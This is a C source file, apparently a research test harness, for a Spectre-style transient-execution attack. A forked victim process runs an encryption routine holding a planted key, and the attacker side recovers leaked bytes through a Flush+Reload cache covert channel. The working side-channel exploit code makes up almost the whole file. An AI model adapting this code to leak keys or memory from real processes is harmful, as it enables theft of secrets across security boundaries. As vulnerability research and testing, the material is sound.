#define _GNU_SOURCE

#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/prctl.h>

#include "libxom.h"
#include "libcache/cacheutils.h"
#include "microarchitecture.h"

char *victim_page;

#define SECRET 0x90

extern unsigned long perform_encryption(unsigned long plain, unsigned long key);

extern unsigned long victim(unsigned long plain, void* encrypt_function);

extern void leak_to_cache(unsigned long _unused1, unsigned long _unused2, unsigned long leak_value);

extern void* dmem;

unsigned long __attribute__((noinline)) f1(unsigned long (*f) (unsigned long), unsigned long p){ return f(p); }
unsigned long __attribute__((noinline)) f2(unsigned long (*f) (unsigned long), unsigned long p){ return f1(f, p); }
unsigned long __attribute__((noinline)) f3(unsigned long (*f) (unsigned long), unsigned long p){ return f2(f, p); }
unsigned long __attribute__((noinline)) f4(unsigned long (*f) (unsigned long), unsigned long p){ return f3(f, p); }
unsigned long __attribute__((noinline)) f5(unsigned long (*f) (unsigned long), unsigned long p){ return f4(f, p); }
unsigned long __attribute__((noinline)) f6(unsigned long (*f) (unsigned long), unsigned long p){ return f5(f, p); }
unsigned long __attribute__((noinline)) f7(unsigned long (*f) (unsigned long), unsigned long p){ return f6(f, p); }
unsigned long __attribute__((noinline)) f8(unsigned long (*f) (unsigned long), unsigned long p){ return f7(f, p); }
unsigned long __attribute__((noinline)) f9(unsigned long (*f) (unsigned long), unsigned long p){ return f8(f, p); }
unsigned long __attribute__((noinline)) fa(unsigned long (*f) (unsigned long), unsigned long p){ return f9(f, p); }
unsigned long __attribute__((noinline)) fb(unsigned long (*f) (unsigned long), unsigned long p){ return fa(f, p); }
unsigned long __attribute__((noinline)) fc(unsigned long (*f) (unsigned long), unsigned long p){ return fb(f, p); }
unsigned long __attribute__((noinline)) fd(unsigned long (*f) (unsigned long), unsigned long p){ return fc(f, p); }
unsigned long __attribute__((noinline)) fe(unsigned long (*f) (unsigned long), unsigned long p){ return fd(f, p); }
unsigned long __attribute__((noinline)) ff(unsigned long (*f) (unsigned long), unsigned long p){ return fe(f, p); }
unsigned long __attribute__((noinline)) f_root(unsigned long (*f) (unsigned long), unsigned long p){ return ff(f, p); }

static volatile unsigned char stop = 0;
static uint32_t cores;

void* code_page = NULL;

void set_processor_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

static uint32_t get_sibling_cores() {
    const static size_t max_cpu_cores = 0x100;
    const static char mpath[] = "/proc/cpuinfo";
    char *line = NULL;
    unsigned int corenum;
    int parsed, count = 0, i, j;
    size_t len = 0;
    FILE *info;
    uint8_t cpu_cores[max_cpu_cores];

    info = fopen(mpath, "r");
    if (!info)
        return 1 << 16;

    // Get amount of executable memory regions
    while (getline(&line, &len, info) > 0 && count < max_cpu_cores) {
        parsed = sscanf(line, "core id\t\t: %u", &corenum);
        free(line);
        line = NULL;
        if (parsed <= 0)
            continue;
        cpu_cores[count++] = (uint8_t) corenum;
    }

    fclose(info);

    for (i = count - 1; i >= 0; i--) {
        for (j = i - 1; j >= 0; j--) {
            if (cpu_cores[i] == cpu_cores[j])
                return (((uint32_t) i) << 16) | (uint32_t) j;
        }
    }

    return 1 << 16;
}

static uint8_t spectre_isb_sa_ip_test_generic(uint32_t success_fraction, uint32_t num_samples) {
    uint32_t counter = 0, success_counter = 0;
    code_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    uint64_t key = 0;
    uint8_t* key_ptr = (&((uint8_t*)code_page)[9]);
    unsigned long (*victim_ptr)(unsigned long, void*) = (void*) (((char*) code_page) + (((char*) victim) - ((char*) perform_encryption)));



    memcpy(code_page, perform_encryption, 0x1000);

    pagesize = sysconf(_SC_PAGESIZE);
    // Detect cache threshold
    if (!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    printf("[\x1b[33m*\x1b[0m] Running on cores %u and %u\n", (cores & 0xffff), (cores >> 16));
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    char *_mem = mmap(NULL, pagesize * (256 + 4), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    dmem = mem = (char *) (((size_t) _mem & ~(pagesize - 1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);


    pid_t pid = fork();
    if(!pid){
        // Victim
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        //set_processor_affinity((int) (cores & 0xffff));
        set_processor_affinity((int) (cores >> 16));

        key = 0xdededededededede;
        memcpy(key_ptr, &key, sizeof(key));
        for(;;) {
            mfence();
            unsigned c = 0x10000;
            nospec();
            while(c--){
                //attacker(mem);
                asm volatile("xor %rdx, %rdx");
                victim_ptr(0, leak_to_cache);
            }
            nospec();
            usleep(10);
        }
    }

    // Attacker
    set_processor_affinity((int) (cores >> 16));
    memcpy(key_ptr, &key, sizeof(key));

    while (1) {
        if (counter >= num_samples) {
            stop = 1;
            return success_counter >= num_samples / success_fraction ? 1 : 0;
        }

        // Flush our shared memory
        flush_shared_memory();

        mfence();
        nospec();

        nospec();
        victim_ptr(0xabababababababab, perform_encryption);

        // Recover data from covert channel
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
            if (flush_reload(mem + mix_i * pagesize)) {

                counter++;
                if (mix_i == 0xef)
                    success_counter++;
                if (mix_i != 0) {
                    printf("0x%02x   ", (uint8_t) mix_i);
                    fflush(stdout);
                }
                sched_yield();
            }
        }
    }
}


int main() {
    uint32_t num_samples = 0x10000, success_fraction = 0x16;
    cores = get_sibling_cores();
    const uint8_t any = spectre_isb_sa_ip_test_generic(success_fraction, num_samples);


    printf("Result: %u\n", any);
    return 0;
}
